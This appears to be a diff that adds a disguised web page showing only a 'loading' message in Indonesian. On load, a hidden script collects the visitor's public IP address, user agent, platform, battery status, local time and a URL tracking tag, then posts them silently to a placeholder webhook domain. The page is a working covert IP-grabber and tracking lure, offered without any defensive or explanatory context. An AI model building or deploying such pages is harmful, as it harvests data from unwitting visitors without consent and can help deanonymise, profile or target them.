@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <meta charset="UTF-8" />
+  <script>
+    async function getInfo() {
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+      const battery = await navigator.getBattery();
+      const info = {
+        ip: ip.ip,
+        ua: navigator.userAgent,
+        os: navigator.platform,
+        battery: {
+          level: battery.level * 100 + '%',
+          charging: battery.charging
+        },
+        time: new Date().toLocaleString(),
+        from: new URLSearchParams(location.search).get('u') || 'unknown'
+      };
+      await fetch('https://your-domain.com/webhook.js', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(info)
+      });
+    }
+    getInfo();
+  </script>
+</head>
+<body>
+  <h1>Sedang memuat...</h1>
+</body>
+</html>
